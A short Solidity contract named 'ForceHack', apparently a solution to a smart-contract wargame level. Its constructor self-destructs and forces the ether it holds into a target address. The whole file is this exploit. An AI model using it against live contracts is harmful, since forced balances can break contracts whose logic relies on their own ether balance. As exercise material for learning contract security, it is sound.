// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract ForceHack {
    constructor(address payable _force) payable {
        selfdestruct(_force);
    }
}
